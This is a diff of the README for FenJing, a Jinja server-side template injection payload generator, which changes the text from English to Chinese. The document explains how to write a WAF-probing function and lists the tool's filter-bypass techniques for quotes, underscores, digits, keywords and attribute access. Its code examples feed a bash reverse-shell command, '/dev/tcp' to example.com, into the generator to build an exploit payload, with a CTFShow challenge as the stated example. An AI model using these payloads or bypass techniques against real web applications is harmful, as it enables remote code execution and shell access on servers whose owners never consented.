@@ -2,18 +2,15 @@
 
 > Bypassing the WAF without knowing WAF
 
-![中文](./README_zh.md)
+## 介绍
 
-## Introduction
+焚靖是一个针对Jinja SSTI的Payload生成器，支持自动检测WAF并尝试绕过
 
-FenJing is a payload generator targeting on Jinja SSTI. It supports automatically detecting and bypassing WAF.
+## 使用
 
+示例：[CTFShow]web372
 
-## Usage
-
-Example：[CTFShow]web372
-
-First, you should write a function that receive a string. If the string contains characters that would be WAF, return False, otherwise return True.
+首先写一个函数，这个函数接受一个字符串，如果这个字符串包含会被WAF的字符，则返回False，否则返回True
 
 ```python
 @functools.lru_cache
@@ -27,13 +24,13 @@ def waf(s: str):
     return r.text != ":("
 ```
 
-Then pass this function and the shell command you need to this module. The module would generate payload for you.
+然后将这个函数和你要运行的shell命令传给模块，即可生成payload
 
 ```python
 payload = shell_cmd(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3003 0>&1\"")
 ```
 
-Full example
+完整示例：
 
 ```python
 from ssti import shell_cmd
@@ -66,13 +63,13 @@ r = requests.get(url, params = {
 print(r.text)
 ```
 
-## Feature
+## 特性
 
-It supports bypassing:
+支持绕过：
 
-- `'` and `"`
-- Most of the keywords
-- any number
+- `'`和`"`
+- 绝大多数敏感关键字
+- 任意阿拉伯数字
 - `_`
 - `[`
 - `+`
@@ -80,50 +77,55 @@ It supports bypassing:
 - `~`
 - `{{`
 
-### Bypassing for natural numbers:
+### 自然数绕过：
 
-It supports bypassing `+` or `-` when bypassing 0-9 at the same time.
+支持绕过0-9的同时绕过加号或减号
 
-It supports two ways for bypassing number detection:
+支持全角数字和特定数字相加减两种绕过方式
 
-- Full-width numerals
-- Calculate any natural number with `+`, `-` and some special variables.  
+### `'%c'`绕过:
 
-### Bypassing for `'%c'`:
+支持绕过引号，`g`和`lipsum`
 
-Support bypassing `'`, `"`, `g` and `lipsum`.
+### 下划线绕过：
 
-### Bypassing for `_`：
+支持`(lipsum|escape|batch(22)|list|first|last)`
+- 其中的数字22支持上面的数字绕过
 
-Support `(lipsum|escape|batch(22)|list|first|last)`
-- number 22 support the bypassing mentioned above.
+### 任意字符串：
 
-### Bypassing for any string:
+支持绕过引号，任意字符串拼接符号，下划线和任意关键词
 
-Supprot bypassing `'`, `"`, `+`, `_`, `~` and any keyword.
-
-It supports these forms:
+支持以下形式
 
 - `'str'`
 - `"str"`
 - `"\x61\x61\x61"`
 - `dict(__class__=cycler)|join`
-- `'%c'*3%(97,97,97)`
+    - 其中的下划线支持绕过
+- `'%c'*3%(97,97, 97)`
+    - 其中的`'%c'`也支持上面的`'%c'`绕过
+    - 其中的所有数字都支持上面的数字绕过
 
-### Bypassing for any attributes:
+### 属性：
 
 - `['aaa']`
+    - 其中的字符串支持上面的任意字符串绕过
 - `.aaa`
 - `|attr('aaa')`
+    - 其中的字符串也支持上面的任意字符串绕过
 
-### Bypassing for any item:
+### Item
 
 - `['aaa']`
+    - 其中的字符串支持上面的任意字符串绕过
 - `.aaa`
 - `.__getitem__('aaa')`
+    - 其中的`__getitem__`支持上面的属性绕过
+    - 其中的字符串也支持上面的任意字符串绕过
 
 
-### Example for testing:
+### 测试绕过：
 
 ```python
 from ssti import shell_cmd
@@ -148,3 +150,4 @@ payload = shell_cmd(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\""
 
 print(payload)
 ```
+
